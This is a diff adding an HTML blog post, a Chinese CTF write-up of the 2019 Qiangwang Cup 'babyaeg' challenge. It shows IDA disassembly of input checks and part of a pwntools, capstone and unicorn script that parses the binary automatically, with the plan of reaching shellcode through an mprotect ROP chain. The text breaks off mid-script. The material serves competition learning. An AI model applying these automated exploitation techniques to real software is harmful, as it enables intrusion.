@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="850">
+
+
+
+<meta name="description" content="上周末参加了强网杯线上预选赛，和学长一起做了一道babyaeg。第一次接触aeg，写了一下解析的部分，还挺有意思的，感觉是一个很有趣的方向。">
+<meta name="keywords" content="pwn,ctf,强网杯,aeg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019强网杯预选赛babyaeg writeup">
+<meta property="og:url" content="http://850.world/2019/05/27/qwb2019-qual/index.html">
+<meta property="og:site_name" content="850&#39;s World">
+<meta property="og:description" content="上周末参加了强网杯线上预选赛，和学长一起做了一道babyaeg。第一次接触aeg，写了一下解析的部分，还挺有意思的，感觉是一个很有趣的方向。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-28T08:19:20.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019强网杯预选赛babyaeg writeup">
+<meta name="twitter:description" content="上周末参加了强网杯线上预选赛，和学长一起做了一道babyaeg。第一次接触aeg，写了一下解析的部分，还挺有意思的，感觉是一个很有趣的方向。">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="850&#39;s World" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>2019强网杯预选赛babyaeg writeup | 850&#39;s World</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">850</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:zjq000100@outlook.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/8-5-0" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/zhu-jia-qi-47-3/" title="知乎"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2019-国赛/">2019 国赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/35c3-junior/">35c3 junior</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/aeg/">aeg</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xnuca/">xnuca</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/强网杯/">强网杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/摸鱼/">摸鱼</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程/">教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/萌新向/">萌新向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/鹏城杯/">鹏城杯</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">850</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">850</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:zjq000100@outlook.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/8-5-0" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/zhu-jia-qi-47-3/" title="知乎"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-qwb2019-qual" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/27/qwb2019-qual/" class="article-date">
+      <time datetime="2019-05-27T02:35:51.000Z" itemprop="datePublished">2019-05-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019强网杯预选赛babyaeg writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/aeg/">aeg</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/强网杯/">强网杯</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>上周末参加了强网杯线上预选赛，和学长一起做了一道babyaeg。第一次接触aeg，写了一下解析的部分，还挺有意思的，感觉是一个很有趣的方向。<br><a id="more"></a></p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>连上这题会给你动态生成一个binary，然后读入任意长度的内容，但是要验证前<code>51+8</code>个字符，通过验证后才会将后面的内容memcpy到栈上。漏洞很简单，主要是怎么过前面<code>51+8</code>个字节的check，这个就比较复杂。因为每次连上都是不同的binary，同时有5秒的时间限制，我们需要写一个自动化生成payload的脚本才能实现动态解析。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这里我们使用<code>capstone</code>和<code>unicorn</code>来实现aeg，其实可以用<code>angr</code>，但是我菜，不会，得学。首先观察前面48个字节的验证逻辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000504A542                 push    rbp</span><br><span class="line">.text:000000000504A543                 mov     rbp, rsp</span><br><span class="line">.text:000000000504A546                 sub     rsp, 10h</span><br><span class="line">.text:000000000504A54A                 mov     ecx, esi</span><br><span class="line">.text:000000000504A54C                 mov     eax, edx</span><br><span class="line">.text:000000000504A54E                 mov     edx, edi</span><br><span class="line">.text:000000000504A550                 mov     [rbp+var_4], dl</span><br><span class="line">.text:000000000504A553                 mov     edx, ecx</span><br><span class="line">.text:000000000504A555                 mov     [rbp+var_8], dl</span><br><span class="line">.text:000000000504A558                 mov     [rbp+var_C], al</span><br><span class="line">.text:000000000504A55B                 cmp     [rbp+var_4], 0D4h</span><br><span class="line">.text:000000000504A55F                 jnz     short loc_504A5C2 &lt;======================= pos 1</span><br><span class="line">.text:000000000504A561                 movzx   eax, [rbp+var_4]</span><br><span class="line">.text:000000000504A565                 mov     edx, 46h</span><br><span class="line">.text:000000000504A56A                 imul    eax, edx</span><br><span class="line">.text:000000000504A56D                 sub     al, [rbp+var_8]</span><br><span class="line">.text:000000000504A570                 cmp     al, 4Dh</span><br><span class="line">.text:000000000504A572                 jnz     short loc_504A5C2 &lt;======================= pos 2</span><br><span class="line">.text:000000000504A574                 movzx   edx, [rbp+var_4]</span><br><span class="line">.text:000000000504A578                 mov     eax, edx</span><br><span class="line">.text:000000000504A57A                 shl     eax, 2</span><br><span class="line">.text:000000000504A57D                 add     eax, edx</span><br><span class="line">.text:000000000504A57F                 shl     eax, 2</span><br><span class="line">.text:000000000504A582                 lea     ecx, [rax+rdx]</span><br><span class="line">.text:000000000504A585                 movzx   edx, [rbp+var_8]</span><br><span class="line">.text:000000000504A589                 mov     eax, edx</span><br><span class="line">.text:000000000504A58B                 add     eax, eax</span><br><span class="line">.text:000000000504A58D                 add     eax, edx</span><br><span class="line">.text:000000000504A58F                 shl     eax, 4</span><br><span class="line">.text:000000000504A592                 add     eax, ecx</span><br><span class="line">.text:000000000504A594                 sub     al, [rbp+var_C]</span><br><span class="line">.text:000000000504A597                 cmp     al, 3Bh</span><br><span class="line">.text:000000000504A599                 jnz     short loc_504A5C2 &lt;======================= pos 3</span><br><span class="line">.text:000000000504A59B                 movzx   eax, cs:byte_524DF80+5</span><br><span class="line">.text:000000000504A5A2                 movzx   edx, al</span><br><span class="line">.text:000000000504A5A5                 movzx   eax, cs:byte_524DF80+4</span><br><span class="line">.text:000000000504A5AC                 movzx   ecx, al</span><br><span class="line">.text:000000000504A5AF                 movzx   eax, cs:byte_524DF80+3</span><br><span class="line">.text:000000000504A5B6                 movzx   eax, al</span><br><span class="line">.text:000000000504A5B9                 mov     esi, ecx</span><br><span class="line">.text:000000000504A5BB                 mov     edi, eax</span><br><span class="line">.text:000000000504A5BD                 call    sub_504A4C4</span><br></pre></td></tr></table></figure></p>
+<p>关注几个<code>jnz</code>的地方，我们需要的到符合判断条件的结果，因此可以反推初始状态下应该是啥。前48个字节的判断很好做，直接定位<code>jnz</code>然后符号执行。接下来3个字节与前面48个字节的处理方式不一样。我们以第49个字节的判断为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000005049D40                 push    rbp</span><br><span class="line">.text:0000000005049D41                 mov     rbp, rsp</span><br><span class="line">.text:0000000005049D44                 sub     rsp, 50h</span><br><span class="line">.text:0000000005049D48                 mov     [rbp+var_48], rdi</span><br><span class="line">.text:0000000005049D4C                 mov     rax, [rbp-48h]</span><br><span class="line">.text:0000000005049D50                 sub     rax, 30h</span><br><span class="line">.text:0000000005049D54                 mov     [rbp+var_4], eax</span><br><span class="line">.text:0000000005049D57                 mov     [rbp+var_20], 0</span><br><span class="line">.text:0000000005049D5E                 mov     [rbp+var_1C], 1</span><br><span class="line">.text:0000000005049D65                 mov     [rbp+var_18], 3</span><br><span class="line">.text:0000000005049D6C                 mov     [rbp+var_14], 2</span><br><span class="line">.text:0000000005049D73                 mov     [rbp+var_10], 4</span><br><span class="line">.text:0000000005049D7A                 mov     [rbp+var_40], 8</span><br><span class="line">.text:0000000005049D81                 mov     [rbp+var_3C], 9</span><br><span class="line">.text:0000000005049D88                 mov     [rbp+var_38], 6</span><br><span class="line">.text:0000000005049D8F                 mov     [rbp+var_34], 5</span><br><span class="line">.text:0000000005049D96                 mov     [rbp+var_30], 7</span><br><span class="line">.text:0000000005049D9D                 mov     ecx, [rbp+var_4]</span><br><span class="line">.text:0000000005049DA0                 mov     edx, 66666667h</span><br><span class="line">.text:0000000005049DA5                 mov     eax, ecx</span><br><span class="line">.text:0000000005049DA7                 imul    edx</span><br><span class="line">.text:0000000005049DA9                 sar     edx, 1</span><br><span class="line">.text:0000000005049DAB                 mov     eax, ecx</span><br><span class="line">.text:0000000005049DAD                 sar     eax, 1Fh</span><br><span class="line">.text:0000000005049DB0                 sub     edx, eax</span><br><span class="line">.text:0000000005049DB2                 mov     eax, edx</span><br><span class="line">.text:0000000005049DB4                 shl     eax, 2</span><br><span class="line">.text:0000000005049DB7                 add     eax, edx</span><br><span class="line">.text:0000000005049DB9                 sub     ecx, eax</span><br><span class="line">.text:0000000005049DBB                 mov     eax, ecx</span><br><span class="line">.text:0000000005049DBD                 mov     [rbp+var_8], eax</span><br><span class="line">.text:0000000005049DC0                 mov     eax, [rbp-8]</span><br><span class="line">.text:0000000005049DC3                 cdqe</span><br><span class="line">.text:0000000005049DC5                 mov     eax, [rbp+rax*4-20h]</span><br><span class="line">.text:0000000005049DC9                 cdqe</span><br><span class="line">.text:0000000005049DCB                 mov     eax, [rbp+rax*4-40h]</span><br><span class="line">.text:0000000005049DCF                 cmp     eax, 6</span><br><span class="line">.text:0000000005049DD2                 jnz     short loc_5049DE6 &lt;===========================pos 1</span><br><span class="line">.text:0000000005049DD4                 movzx   eax, cs:byte_524DF80+31h</span><br><span class="line">.text:0000000005049DDB                 movzx   eax, al</span><br><span class="line">.text:0000000005049DDE                 mov     rdi, rax</span><br><span class="line">.text:0000000005049DE1                 call    sub_5049BF1</span><br></pre></td></tr></table></figure></p>
+<p>同样注意<code>jnz</code>,发现之前都是对读入的值经过一系列的运算的到了结果，这里我们直接爆破一些，从<code>mov     [rbp+var_48], rdi</code>这一句开始执行，爆破<code>rdi</code>即可得到这里应该是啥。最后8字节是通过读取rodata段上某个地址的值来验证的，我们也解析一下语句去读一下就好了。此外还有一些需要动态处理的数据如最后一个函数的栈帧大小，<code>main</code>函数的地址，<code>bss</code>段的地址。全部都解析完了之后直接rop用mprotect使存shellcode的地方可写然后跳到shellcode即可。exp及其难看。</p>
+<p>解析代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: 850</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pwn script framework</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BASE</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        initial basic paramaters</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.rhost = remote_host</span><br><span class="line">        self.rport = remote_port</span><br><span class="line">        self.elf_name = local_elf</span><br><span class="line">        self.gdb_scripts = gdb_script</span><br><span class="line">        self.local_libc = _local_libc</span><br><span class="line">        self.remote_libc = _remote_libc</span><br><span class="line">        context(os=<span class="string">'linux'</span>, log_level=_log_level)</span><br><span class="line">        context(terminal=[<span class="string">"xfce4-terminal"</span>, <span class="string">"-e"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">local_debug</span><span class="params">(self, gdb_attach)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        debug with GDB</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.target = process(self.elf_name)</span><br><span class="line">        self.elf = ELF(self.elf_name)</span><br><span class="line">        self.libc = ELF(self.local_libc)</span><br><span class="line">        <span class="keyword">if</span> gdb_attach:</span><br><span class="line">            gdb.attach(self.target, gdbscript=self.gdb_scripts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remote_attack</span><span class="params">(self,)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        remote exploit</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.libc = ELF(self.remote_libc)</span><br><span class="line">        self.target = remote(self.rhost, self.rport)</span><br><span class="line">        self.elf = ELF(self.elf_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,)</span>:</span></span><br><span class="line">        self.local_debug(gdb_attach=<span class="keyword">False</span>)</span><br><span class="line">        <span class="comment"># self.remote_attack()</span></span><br><span class="line">        <span class="keyword">with</span> open(self.elf_name, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            bytecode = f.read()</span><br><span class="line">        md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">        offset = self.elf.vaddr_to_offset(self.elf.entrypoint)</span><br><span class="line">        disasm_result = md.disasm(</span><br><span class="line">            bytecode[offset:offset + <span class="number">0x100</span>], self.elf.entrypoint)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> disasm_result:</span><br><span class="line">            <span class="comment"># print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"rdi"</span> <span class="keyword">in</span> i.op_str:</span><br><span class="line">                main_addr = int(i.op_str[i.op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">"rcx"</span> <span class="keyword">in</span> i.op_str:</span><br><span class="line">                init_addr = int(i.op_str[i.op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">        offset = self.elf.vaddr_to_offset(main_addr)</span><br><span class="line">        disasm_result = list(</span><br><span class="line">            md.disasm(bytecode[offset:offset + <span class="number">0x1000</span>], main_addr))</span><br><span class="line">        count = <span class="number">8</span></span><br><span class="line">        xor_value = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">            <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"call"</span>:</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                    first_func_start = int(disasm_result[i].op_str, <span class="number">16</span>)</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):  </span><br><span class="line">            <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"xor"</span>:</span><br><span class="line">                xor_value.append(int(disasm_result[i].op_str[disasm_result[i].op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>))</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">            <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"lea"</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">4</span>:</span><br><span class="line">                    <span class="comment"># print("0x%x:\t%s\t%s" %(disasm_result[i].address, disasm_result[i].mnemonic, disasm_result[i].op_str))                    </span></span><br><span class="line">                    tmp = 